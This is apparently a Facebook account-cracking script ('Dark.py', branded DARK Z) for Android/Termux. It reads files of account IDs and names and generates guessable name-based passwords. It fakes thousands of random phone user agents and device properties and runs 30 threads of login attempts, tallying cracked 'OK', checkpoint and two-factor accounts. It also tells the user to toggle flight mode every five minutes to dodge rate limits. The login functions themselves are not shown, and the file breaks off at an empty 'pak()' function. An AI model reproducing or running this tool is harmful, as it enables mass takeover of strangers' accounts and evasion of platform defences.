import uuid
import string
from os import path
from urllib.request import urlopen
import os
import time
import re
import random
import sys
import subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred

def clear():
    os.system('clear')
def install():
    os.system('pkg install espeak')
    
print('sus')
print('\033[1;37m\033[1;32m[+]CHECKING UPDATES...')
time.sleep(5)
os.system("git pull")

try:
    import requests
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python Dark.py')

except:pass
ugen = []
brands = ['Oppo', 'Infinix', 'Realme', 'Samsung', 'Redmi', 'Xiaomi', 'Nokia', 'Acer', 'Asus', 'Tecno', 'OnePlus', 'Huawei']
device_models = {
    'Oppo': ['Oppo Reno 6', 'Oppo A93', 'Oppo Find X3', 'Oppo F19', 'Oppo A74', 'Oppo Reno 5', 'Oppo A53', 'Oppo F17', 'Oppo Reno 4',
             'Oppo A12', 'Oppo A15', 'Oppo F15', 'Oppo A92', 'Oppo Reno 3', 'Oppo F11', 'Oppo A9', 'Oppo F9', 'Oppo A5', 'Oppo F7', 'Oppo A7',
             'Oppo Reno 2', 'Oppo A91', 'Oppo Find X2', 'Oppo F17 Pro', 'Oppo A72', 'Oppo A52'],
    'Infinix': ['Infinix Zero X', 'Infinix Zero X Pro', 'Infinix Note 11', 'Infinix Note 11 Pro', 'Infinix Hot 11', 'Infinix Hot 11 Pro',
            'Infinix Note 10', 'Infinix Note 10 Pro', 'Infinix Hot 10', 'Infinix Hot 10 Pro', 'Infinix Zero 8', 'Infinix Zero 8i',
            'Infinix Note 8', 'Infinix Note 8i', 'Infinix Hot 8', 'Infinix Hot 8 Lite', 'Infinix S5', 'Infinix S5 Lite', 'Infinix S5 Pro',
            'Infinix S4', 'Infinix S4 Lite', 'Infinix Hot 7', 'Infinix Hot 7 Pro', 'Infinix Hot 7 Lite', 'Infinix Note 6', 'Infinix Note 6 Lite',
            'Infinix Hot 6', 'Infinix Hot 6 Pro', 'Infinix Hot 6X', 'Infinix Note 5', 'Infinix Note 5 Stylus', 'Infinix Smart 5',
            'Infinix Smart 5A', 'Infinix Smart 5C', 'Infinix Hot 5', 'Infinix Hot 5 Lite', 'Infinix Hot 4', 'Infinix Hot 4 Pro', 'Infinix Hot 4 Lite',
            'Infinix S3', 'Infinix S3X', 'Infinix Smart 4', 'Infinix Smart 4 Plus', 'Infinix Smart 4C', 'Infinix Note 3', 'Infinix Note 3 Pro',
            'Infinix Note 2', 'Infinix Note 2 Pro', 'Infinix Smart 3', 'Infinix Smart 3 Plus', 'Infinix Smart 3i', 'Infinix Hot 3', 'Infinix Hot 3 Pro',
            'Infinix Hot 2', 'Infinix Hot 2 Pro', 'Infinix S2', 'Infinix S2 Pro', 'Infinix S', 'Infinix S Pro', 'Infinix Zero 6', 'Infinix Zero 6 Pro',
            'Infinix Zero 5', 'Infinix Zero 5 Pro', 'Infinix Zero 4', 'Infinix Zero 4 Plus', 'Infinix Zero 3', 'Infinix Zero 2', 'Infinix Zero 1'],
    'Realme': ['Realme GT 5G', 'Realme GT Master Edition', 'Realme GT Neo 2', 'Realme GT Neo', 'Realme GT 2', 'Realme GT',
           'Realme X9 Pro', 'Realme X9', 'Realme X7 Max 5G', 'Realme X7 Pro 5G', 'Realme X7 5G', 'Realme X7 Pro Ultra',
           'Realme X7 Pro', 'Realme X7', 'Realme X3 SuperZoom', 'Realme X3', 'Realme X2 Pro', 'Realme X2', 'Realme X',
           'Realme V15 5G', 'Realme V13 5G', 'Realme V11 5G', 'Realme V9 5G', 'Realme V7 5G', 'Realme V5 5G',
           'Realme Q3 Pro 5G', 'Realme Q3i 5G', 'Realme Q3 5G', 'Realme Q2i 5G', 'Realme Q2 Pro 5G', 'Realme Q2 5G',
           'Realme Q1 5G', 'Realme Q', 'Realme Narzo 50A', 'Realme Narzo 50i', 'Realme Narzo 50 5G', 'Realme Narzo 30 Pro 5G',
           'Realme Narzo 30A', 'Realme Narzo 30i', 'Realme Narzo 30 5G', 'Realme Narzo 20 Pro', 'Realme Narzo 20A',
           'Realme Narzo 20', 'Realme Narzo 10A', 'Realme Narzo 10'],
    'Samsung': ['Galaxy S21', 'Galaxy S21+', 'Galaxy S21 Ultra', 'Galaxy S20', 'Galaxy S20+', 'Galaxy S20 Ultra', 'Galaxy S20 FE',
            'Galaxy S10', 'Galaxy S10+', 'Galaxy S10e', 'Galaxy Note 20', 'Galaxy Note 20 Ultra', 'Galaxy Note 10',
            'Galaxy Note 10+', 'Galaxy Note 9', 'Galaxy Note 8', 'Galaxy A52', 'Galaxy A72', 'Galaxy A51', 'Galaxy A71',
            'Galaxy A32', 'Galaxy A42', 'Galaxy A21s', 'Galaxy A12', 'Galaxy M51', 'Galaxy M31', 'Galaxy M21', 'Galaxy M12',
            'Galaxy Z Fold 2', 'Galaxy Z Flip', 'Galaxy Z Flip 3', 'Galaxy Z Fold 3', 'Galaxy Fold', 'Galaxy A10', 'Galaxy A20',
            'Galaxy A30', 'Galaxy A40', 'Galaxy A50', 'Galaxy A60', 'Galaxy A70', 'Galaxy A80', 'Galaxy A90', 'Galaxy M10',
            'Galaxy M20', 'Galaxy M30', 'Galaxy M40', 'Galaxy M50', 'Galaxy J3', 'Galaxy J5', 'Galaxy J7', 'Galaxy J6',
            'Galaxy J8', 'Galaxy J4', 'Galaxy J5 Pro', 'Galaxy J7 Pro', 'Galaxy J6+', 'Galaxy J8+', 'Galaxy J4+',
            'Galaxy J2 Core', 'Galaxy Xcover 4s', 'Galaxy Xcover Pro', 'Galaxy A01', 'Galaxy A10s', 'Galaxy A20s',
            'Galaxy A30s', 'Galaxy A40s', 'Galaxy A50s', 'Galaxy A60s', 'Galaxy A70s', 'Galaxy A80s', 'Galaxy A90s',
            'Galaxy M01', 'Galaxy M11', 'Galaxy M21s', 'Galaxy M31s', 'Galaxy M51s', 'Galaxy J2', 'Galaxy J7 Duo',
            'Galaxy J6 Plus', 'Galaxy J4 Plus', 'Galaxy J4 Core', 'Galaxy J2 Pro', 'Galaxy J3 Pro', 'Galaxy J5 Pro',
            'Galaxy J7 Pro', 'Galaxy J2 Prime', 'Galaxy J5 Prime', 'Galaxy J7 Prime', 'Galaxy J2 Ace', 'Galaxy J1 Mini',
            'Galaxy J3 (2018)', 'Galaxy J4 (2018)', 'Galaxy J6 (2018)', 'Galaxy J7 (2018)', 'Galaxy J2 Core (2018)',
            'Galaxy J2 (2017)', 'Galaxy J3 (2017)', 'Galaxy J5 (2017)', 'Galaxy J7 (2017)', 'Galaxy J7 Max', 'Galaxy J7 Pro',
            'Galaxy J7 V', 'Galaxy J7 Perx', 'Galaxy J7 Prime', 'Galaxy J7 Nxt', 'Galaxy J7+', 'Galaxy J5', 'Galaxy J3',
            'Galaxy J2', 'Galaxy J1', 'Galaxy J1 Ace', 'Galaxy J1 Mini Prime', 'Galaxy J3 Pro', 'Galaxy J5 Pro',
            'Galaxy J7 Pro', 'Galaxy J2 Pro', 'Galaxy J1 4G', 'Galaxy J2 4G', 'Galaxy J3 4G', 'Galaxy J4 4G',
            'Galaxy J5 4G', 'Galaxy J6 4G', 'Galaxy J7 4G', 'Galaxy J7 Prime 4G', 'Galaxy J2 Ace'],
    'Redmi': ['Redmi 9', 'Redmi 9A', 'Redmi 9C', 'Redmi 9i', 'Redmi 9T', 'Redmi 10', 'Redmi 10A', 'Redmi 10C', 'Redmi 10i', 'Redmi 10T',
          'Redmi Note 9', 'Redmi Note 9A', 'Redmi Note 9C', 'Redmi Note 9i', 'Redmi Note 9T', 'Redmi Note 10', 'Redmi Note 10A',
          'Redmi Note 10C', 'Redmi Note 10i', 'Redmi Note 10T', 'Redmi Note 11', 'Redmi Note 11A', 'Redmi Note 11C', 'Redmi Note 11i',
          'Redmi Note 11T', 'Redmi K30', 'Redmi K30A', 'Redmi K30C', 'Redmi K30i', 'Redmi K30T', 'Redmi K31', 'Redmi K31A', 'Redmi K31C',
          'Redmi K31i', 'Redmi K31T', 'Redmi K40', 'Redmi K40A', 'Redmi K40C', 'Redmi K40i', 'Redmi K40T', 'Redmi K41', 'Redmi K41A',
          'Redmi K41C', 'Redmi K41i', 'Redmi K41T', 'Redmi Note 5', 'Redmi Note 5A', 'Redmi Note 5C', 'Redmi Note 5i', 'Redmi Note 5T',
          'Redmi Note 6', 'Redmi Note 6A', 'Redmi Note 6C', 'Redmi Note 6i', 'Redmi Note 6T', 'Redmi Note 7', 'Redmi Note 7A',
          'Redmi Note 7C', 'Redmi Note 7i', 'Redmi Note 7T', 'Redmi Note 8', 'Redmi Note 8A', 'Redmi Note 8C', 'Redmi Note 8i',
          'Redmi Note 8T', 'Redmi Note 8 Pro', 'Redmi Note 9 Pro', 'Redmi Note 9 Pro Max', 'Redmi Note 10 Pro', 'Redmi Note 10 Pro Max',
          'Redmi Note 11 Pro', 'Redmi Note 11 Pro Max', 'Redmi K30 Pro', 'Redmi K30 Pro Max', 'Redmi K31 Pro', 'Redmi K31 Pro Max',
          'Redmi K40 Pro', 'Redmi K40 Pro Max', 'Redmi K41 Pro', 'Redmi K41 Pro Max', 'Redmi 9 Pro', 'Redmi 9 Pro Max', 'Redmi 10 Pro',
          'Redmi 10 Pro Max', 'Redmi 11 Pro', 'Redmi 11 Pro Max', 'Redmi K30 Pro', 'Redmi K30 Pro Max', 'Redmi K31 Pro', 'Redmi K31 Pro Max',
          'Redmi K40 Pro', 'Redmi K40 Pro Max', 'Redmi K41 Pro', 'Redmi K41 Pro Max', 'Redmi 9 Pro', 'Redmi 9 Pro Max', 'Redmi 10 Pro',
          'Redmi 10 Pro Max', 'Redmi 11 Pro', 'Redmi 11 Pro Max', 'Redmi K30 Pro', 'Redmi K30 Pro Max', 'Redmi K31 Pro', 'Redmi K31 Pro Max',
          'Redmi K40 Pro', 'Redmi K40 Pro Max', 'Redmi K41 Pro', 'Redmi K41 Pro Max'],
    'Xiaomi': ['Xiaomi Mi 11', 'Xiaomi Mi 11 Pro', 'Xiaomi Mi 11 Ultra', 'Xiaomi Mi 11i', 'Xiaomi Mi 11 Lite', 'Xiaomi Mi 11 Lite 5G',
           'Xiaomi Mi 11X', 'Xiaomi Mi 11X Pro', 'Xiaomi Mi 10', 'Xiaomi Mi 10 Pro', 'Xiaomi Mi 10 Ultra', 'Xiaomi Mi 10T',
           'Xiaomi Mi 10T Pro', 'Xiaomi Mi 10T Lite', 'Xiaomi Mi 10i', 'Xiaomi Mi 9', 'Xiaomi Mi 9 Pro', 'Xiaomi Mi 9 SE',
           'Xiaomi Mi 9 Lite', 'Xiaomi Mi 9T', 'Xiaomi Mi 9T Pro', 'Xiaomi Mi 8', 'Xiaomi Mi 8 Pro', 'Xiaomi Mi 8 Lite',
           'Xiaomi Mi 8 SE', 'Xiaomi Mi Mix', 'Xiaomi Mi Mix 2', 'Xiaomi Mi Mix 2S', 'Xiaomi Mi Mix 3', 'Xiaomi Mi Mix 3 5G',
           'Xiaomi Mi Mix 4', 'Xiaomi Mi Note', 'Xiaomi Mi Note 2', 'Xiaomi Mi Note 3', 'Xiaomi Mi Note 10', 'Xiaomi Mi Note 10 Pro',
           'Xiaomi Mi Note 10 Lite', 'Xiaomi Mi A1', 'Xiaomi Mi A2', 'Xiaomi Mi A2 Lite', 'Xiaomi Mi A3', 'Xiaomi Mi A3 Lite',
           'Xiaomi Poco F1', 'Xiaomi Poco F2', 'Xiaomi Poco F3', 'Xiaomi Poco F3 Pro', 'Xiaomi Poco F3 Lite', 'Xiaomi Poco X3',
           'Xiaomi Poco X3 Pro', 'Xiaomi Poco X3 Lite', 'Xiaomi Poco X2', 'Xiaomi Poco X2 Pro', 'Xiaomi Poco M2', 'Xiaomi Poco M2 Pro',
           'Xiaomi Redmi 9', 'Xiaomi Redmi 9A', 'Xiaomi Redmi 9C', 'Xiaomi Redmi 9T', 'Xiaomi Redmi 10', 'Xiaomi Redmi 10A',
           'Xiaomi Redmi 10T', 'Xiaomi Redmi 10T Pro', 'Xiaomi Redmi 10T Lite', 'Xiaomi Redmi 10i', 'Xiaomi Redmi Note 9',
           'Xiaomi Redmi Note 9 Pro', 'Xiaomi Redmi Note 9 Pro Max', 'Xiaomi Redmi Note 9S', 'Xiaomi Redmi Note 10',
           'Xiaomi Redmi Note 10 Pro', 'Xiaomi Redmi Note 10 Pro Max', 'Xiaomi Redmi Note 10S', 'Xiaomi Redmi Note 10T',
           'Xiaomi Redmi Note 10T Pro', 'Xiaomi Redmi Note 10T Lite', 'Xiaomi Redmi Note 10i', 'Xiaomi Redmi Note 8',
           'Xiaomi Redmi Note 8 Pro', 'Xiaomi Redmi Note 8T', 'Xiaomi Redmi Note 8G', 'Xiaomi Redmi Note 8 Lite',
           'Xiaomi Redmi Note 7', 'Xiaomi Redmi Note 7 Pro', 'Xiaomi Redmi Note 7T', 'Xiaomi Redmi Note 7G',
           'Xiaomi Redmi Note 7 Lite', 'Xiaomi Redmi Note 6', 'Xiaomi Redmi Note 6 Pro', 'Xiaomi Redmi Note 5',
           'Xiaomi Redmi Note 5 Pro', 'Xiaomi Redmi Note 5A', 'Xiaomi Redmi Note 5G', 'Xiaomi Redmi Note 5 Lite',
           'Xiaomi Redmi Note 4', 'Xiaomi Redmi Note 4 Pro', 'Xiaomi Redmi Note 4X', 'Xiaomi Redmi Note 3',
           'Xiaomi Redmi Note 3 Pro', 'Xiaomi Redmi Note 3G', 'Xiaomi Redmi Note 3 Lite', 'Xiaomi Redmi Note 2',
           'Xiaomi Redmi Note 2 Pro', 'Xiaomi Redmi Note 2 Lite', 'Xiaomi Redmi Note 1', 'Xiaomi Redmi Note 1 Pro',
           'Xiaomi Redmi Note 1 Lite', 'Xiaomi Redmi Note', 'Xiaomi Redmi Note Pro', 'Xiaomi Redmi Note Lite',
           'Xiaomi Redmi 8', 'Xiaomi Redmi 8A', 'Xiaomi Redmi 8C', 'Xiaomi Redmi 8T', 'Xiaomi Redmi 8i', 'Xiaomi Redmi 8X',
           'Xiaomi Redmi 8SE', 'Xiaomi Redmi 7', 'Xiaomi Redmi 7 Pro', 'Xiaomi Redmi 7 Max', 'Xiaomi Redmi 7S',
           'Xiaomi Redmi 7C', 'Xiaomi Redmi 7T', 'Xiaomi Redmi 7i', 'Xiaomi Redmi 6', 'Xiaomi Redmi 6 Pro',
           'Xiaomi Redmi 6 Max', 'Xiaomi Redmi 6S', 'Xiaomi Redmi 6C', 'Xiaomi Redmi 6T', 'Xiaomi Redmi 6i',
           'Xiaomi Redmi 5', 'Xiaomi Redmi 5 Pro', 'Xiaomi Redmi 5 Max', 'Xiaomi Redmi 5S', 'Xiaomi Redmi 5C',
           'Xiaomi Redmi 5T', 'Xiaomi Redmi 5i', 'Xiaomi Redmi 4', 'Xiaomi Redmi 4 Pro', 'Xiaomi Redmi 4 Max',
           'Xiaomi Redmi 4S', 'Xiaomi Redmi 4C', 'Xiaomi Redmi 4T', 'Xiaomi Redmi 4i', 'Xiaomi Redmi 3',
           'Xiaomi Redmi 3 Pro', 'Xiaomi Redmi 3 Max', 'Xiaomi Redmi 3S', 'Xiaomi Redmi 3C', 'Xiaomi Redmi 3T'],
    'Nokia': ['Nokia 9.4', 'Nokia 8.4', 'Nokia 7.4', 'Nokia 6.4', 'Nokia 5.4', 'Nokia 4.4', 'Nokia 3.4', 'Nokia 2.4', 'Nokia 1.4', 'Nokia 10',
          'Nokia 11', 'Nokia 12', 'Nokia 13', 'Nokia 14', 'Nokia 15', 'Nokia 16', 'Nokia 17', 'Nokia 18', 'Nokia 19', 'Nokia 20',
          'Nokia 21', 'Nokia 22', 'Nokia 23', 'Nokia 24', 'Nokia 25', 'Nokia 26', 'Nokia 27', 'Nokia 28', 'Nokia 29', 'Nokia 30',
          'Nokia 31', 'Nokia 32', 'Nokia 33', 'Nokia 34', 'Nokia 35', 'Nokia 36', 'Nokia 37', 'Nokia 38', 'Nokia 39', 'Nokia 40',
          'Nokia X10', 'Nokia X20', 'Nokia G10', 'Nokia G20', 'Nokia C10', 'Nokia C20', 'Nokia C01 Plus', 'Nokia C20 Plus',
          'Nokia XR20', 'Nokia 8.3 5G', 'Nokia 5.3', 'Nokia 3.4', 'Nokia 2.3', 'Nokia 2.2', 'Nokia 1.3', 'Nokia 1 Plus', 'Nokia 1',
          'Nokia 5.4 Plus', 'Nokia 6.4 Plus', 'Nokia 7.4 Plus', 'Nokia 9.4 Plus', 'Nokia 8.4 Plus', 'Nokia 10 Plus', 'Nokia 11 Plus',
          'Nokia 12 Plus', 'Nokia 13 Plus', 'Nokia 14 Plus', 'Nokia 15 Plus', 'Nokia 16 Plus', 'Nokia 17 Plus', 'Nokia 18 Plus',
          'Nokia 19 Plus', 'Nokia 20 Plus', 'Nokia 21 Plus', 'Nokia 22 Plus', 'Nokia 23 Plus', 'Nokia 24 Plus', 'Nokia 25 Plus',
          'Nokia 26 Plus', 'Nokia 27 Plus', 'Nokia 28 Plus', 'Nokia 29 Plus', 'Nokia 30 Plus', 'Nokia 31 Plus', 'Nokia 32 Plus',
          'Nokia 33 Plus', 'Nokia 34 Plus', 'Nokia 35 Plus', 'Nokia 36 Plus', 'Nokia 37 Plus', 'Nokia 38 Plus', 'Nokia 39 Plus',
          'Nokia 40 Plus', 'Nokia X10 Plus', 'Nokia X20 Plus', 'Nokia G10 Plus', 'Nokia G20 Plus', 'Nokia C10 Plus', 'Nokia C20 Plus',
          'Nokia C01 Plus', 'Nokia C20 Plus', 'Nokia XR20 Plus'],
    'Acer': ['Acer Predator 21 X', 'Acer Predator 17 X', 'Acer Predator 15', 'Acer Predator 17', 'Acer Predator 13', 'Acer Predator 14',
             'Acer Predator 16', 'Acer Predator 18', 'Acer Predator 19', 'Acer Predator 20', 'Acer Predator 12', 'Acer Predator 11',
             'Acer Predator 10', 'Acer Predator 9', 'Acer Predator 8', 'Acer Predator 7', 'Acer Predator 6', 'Acer Predator 5',
             'Acer Predator 4', 'Acer Predator 3', 'Acer Predator 2', 'Acer Predator 1'],
    'Asus': ['Asus ROG Phone 5', 'Asus ROG Phone 3', 'Asus ROG Phone 2', 'Asus ROG Phone 1', 'Asus Zenfone 8', 'Asus Zenfone 7', 'Asus Zenfone 6',
             'Asus Zenfone 5', 'Asus Zenfone 4', 'Asus Zenfone 3', 'Asus Zenfone 2', 'Asus Zenfone 1', 'Asus PadFone X', 'Asus PadFone S',
             'Asus PadFone 2', 'Asus PadFone 1', 'Asus PadFone 3', 'Asus PadFone 4', 'Asus PadFone 5', 'Asus PadFone 6', 'Asus PadFone 7',
             'Asus PadFone 8', 'Asus PadFone 9', 'Asus PadFone 10', 'Asus PadFone 11'],
    'Tecno': ['Tecno Phantom 11', 'Tecno Phantom 10', 'Tecno Phantom 9', 'Tecno Phantom 8', 'Tecno Phantom 7', 'Tecno Phantom 6', 'Tecno Phantom 5',
              'Tecno Phantom 4', 'Tecno Phantom 3', 'Tecno Phantom 2', 'Tecno Phantom 1', 'Tecno Camon 16', 'Tecno Camon 15', 'Tecno Camon 14',
              'Tecno Camon 13', 'Tecno Camon 12', 'Tecno Camon 11', 'Tecno Camon 10', 'Tecno Camon 9', 'Tecno Camon 8', 'Tecno Camon 7',
              'Tecno Spark 7', 'Tecno Spark 6', 'Tecno Spark 5', 'Tecno Spark 4'],
    'OnePlus': ['OnePlus 9 Pro', 'OnePlus 9', 'OnePlus 8 Pro', 'OnePlus 8', 'OnePlus 7T Pro', 'OnePlus 7T', 'OnePlus 7 Pro', 'OnePlus 7',
                'OnePlus 6T', 'OnePlus 6', 'OnePlus 5T', 'OnePlus 5', 'OnePlus 4T', 'OnePlus 4', 'OnePlus 3T', 'OnePlus 3', 'OnePlus 2T',
                'OnePlus 2', 'OnePlus 1T', 'OnePlus 1'],
    'Huawei': ['Huawei P40 Pro', 'Huawei P40', 'Huawei P30 Pro', 'Huawei P30', 'Huawei P20 Pro', 'Huawei P20', 'Huawei P10 Plus', 'Huawei P10',
               'Huawei Mate 30 Pro', 'Huawei Mate 30', 'Huawei Mate 20 Pro', 'Huawei Mate 20', 'Huawei Mate 10 Pro', 'Huawei Mate 10',
               'Huawei Nova 7i', 'Huawei Nova 6', 'Huawei Nova 5', 'Huawei Nova 4', 'Huawei Nova 3', 'Huawei Nova 2',
               'Huawei Mate X', 'Huawei Mate X2', 'Huawei Mate X3', 'Huawei Mate X4', 'Huawei Mate X5']
}

for _ in range(10000):
    brand = random.choice(brands)
    device_model = random.choice(device_models[brand])
    version = random.choice(['4','5','6', '7', '8', '9', '10', '11', '12'])
    build_number = random.randint(1, 999)
    build_number = f"{build_number:03d}"  # Ensure build number has three digits
    webkit_version = random.randint(4200, 4900)
    chrome_version = random.randint(40, 150)
    fullagn = f"Mozilla/5.0 (Linux; Android {version}; {device_model} Build/RP1A.200720.{build_number}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{webkit_version}.0.{chrome_version}.0 Mobile Safari/537.36"
    ugen.append(fullagn)

sim_id = ''
android_version = subprocess.check_output(
    'getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
model = subprocess.check_output(
    'getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
build = subprocess.check_output(
    'getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
fblc = 'en_GB'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
        'utf-8').split(',')[0].replace('\n', '')
except:
    fbcr = 'Zong'
fbmf = subprocess.check_output(
    'getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output(
    'getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode(
    'utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace(
    '\n', '')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '')
try:
    fbcr = subprocess.check_output(
        'getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')
    total = 0
    for i in fbcr:
        total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
            'utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
    elif select == '2':
        try:
            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
                'utf-8').split(',')[1].replace('\n', '')
            sim_id += fbcr
        except Exception as e:
            fbcr = "Zong"
            sim_id += fbcr
    else:
        fbcr = 'Zong'
        sim_id += fbcr
except:
    fbcr = "Zong"
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm}
logo = ("""

██████╗░░█████╗░██████╗░██╗░░██╗        ███████╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝        ╚════██║
██║░░██║███████║██████╔╝█████═╝░        ░░███╔═╝
██║░░██║██╔══██║██╔══██╗██╔═██╗░        ██╔══╝░░
██████╔╝██║░░██║██║░░██║██║░╚██╗        ███████╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝        ╚══════╝

\033[1;91m\033[1;41m\033[1;97m              Be you, The world will adjust               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[👨] AUTHOR    :\033[1;32m DARK X FUZED 
\033[1;32m[📖] GITHUB    :\033[1;32m CODERET-D-LOOPER
\033[1;32m[😇] FACEBOOK  :\033[1;32m FIRDAWS SAPNO
\033[1;32m[💉] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[📅] VERSION   :\033[1;32m 3.6
\033[1;32m[🚀] STATUS    :\033[1;32m WORKING
\033[1;32m[⏳] UPDATE    :\033[1;32m EVERYDAY AT 12.00AM
\033[1;91m<═══\033[1;41m\033[1;97m WORKING ONLY ON MOBILE DATA\033[;0m\033[1;91m═══>\033[1;92m
\033[1;92m══════════════════════════════════════════""")

def linex():
    print('\033[1;92m══════════════════════════════════════════')

def clear():
    os.system('clear')
    print(logo)


loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []


def menu():
    try:
        clear()
        if 1 == 1:
            clear()
            os.system('espeak -a 300 " Welcome,   to,  DARK,  Z,  Tools"')
            print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
            print('\033[1;37m[1️⃣] FILE CLONING\n\033[1;37m[2️⃣] RANDOM CLONING [NOT WORKING]\n\033[1;37m[3️⃣] VISIT MY ACCOUNT\n\033[1;37m[4️⃣] CLOSE TOOL')
            print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
            xd = input('\033[1;37m[💥] CHOOSE : ')
            if xd in ['1', '01']:
                clear()
                os.system('espeak -a 300 " Enter, your, file , path"')
                file = input('\033[1;37m[📂] ENTER FILE PATH: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    os.system('espeak -a 300 " File, location, not, found"')
                    print('[❌] FILE LOCATION NOT FOUND [❌]')
                    time.sleep(1)
                    menu()
                clear()
                print('\033[1;32m[1] METHOD 1 [BEST WORKING]\n[2] METHOD 2')
                os.system('espeak -a 300 " Choose, method, for, cloning"')
                linex()
                mthd = input('\033[1;32m[+] CHOOSE : ')
                linex()
                plist = []
                print('\033[1;37m           SELECT CRACK MENU')
                linex()
                print('[1] AUTO PASSWORD [BEST]\n[2] MANUAL PASSWORD')
                linex()
                ppp = input('\033[1;32m[+] CHOOSE : ')
                if ppp in ['1', '01']:
                    plist.append('first last')
                    plist.append('first')
                    plist.append('firstlast')
                    plist.append('first123')
                    plist.append('first1234')
                    plist.append('first12345')
                    plist.append('first123456')
                    plist.append('first1122')
                    plist.append('first@@')
                    plist.append('first@@@')
                    plist.append('first@@@@')
                    plist.append('first12')
                    plist.append('first111')
                    plist.append('first11')
                    plist.append('i love you')
                    plist.append('last')
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(' HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
                    except:
                        ps_limit = 15
                    linex()
                    print('\033[1;32m EXAMPLE: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(
                            input(f'\033[1;32m[+] PUT PASSWORD {i+1}: '))
                linex()
                print('[🍬]SHOW CP ACCOUNT? (Y/n): ')
                linex()
                cx = input(' CHOOSE: ')
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('[🧮] TOTAL ID : \033[1;32m'+total_ids)
                    print("\033[1;35m[🚄] CRACKING SPEED - FAST✅ ")
                    print("\033[1;33m[🔍] CRACKING HAS BEEN STARTED")
                    linex()
                    print("""\033[1;91m<═══\033[1;41m\033[1;97m ✈ USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m═══>\033[1;92m""")
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(ffb, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(api, ids, names, passlist)
                        else:
                            crack_submit.submit(api1, ids, names, passlist)
                print('\033[1;37m')
                linex()
                print('[😘]CRACKING HAS COMPLETED')
                os.system('espeak -a 300 " Cracking, has, completed"')
                print('[🔰]Total OK/CP/2F: '+str(len(oks)) +
                      '/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                os.system('espeak -a 300 " press, enter, for, main, menu"')
                input('[👉]PRESS ENTER FOR MAIN MENU[👈]')
                os.system('python Dark.py')
            elif xd in ['3', '03']:
                os.system(' xdg-open https://www.facebook.com/coderet.d.looper')
                menu()
            elif xd in ['4', '04']:
                exit('BYE BYE Tata Gaya')
            elif xd in ['2', '02']:
                clear()
                print(
                    ' [1]Pakistan cloning\n [2] Bangladesh cloning\n [3] Indonesia Cloning\n [4] Gmail cloning\n [0] Back menu')
                linex()
                x = input(' Choose: ')
                if x in ['1', '01']:
                    pak()
                elif x in ['2', '02']:
                    bd()
                elif x in ['3', '03']:
                    indo()
                elif x in ['4', '04']:
                    gmail()
                else:
                    menu()
            elif xd in ['5', '05']:
                gmail()
            else:
                exit(' Option not found in menu...')
        else:
            print(' Run :  python Dark.py')
            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()


def pak():
    user = []
    clear()
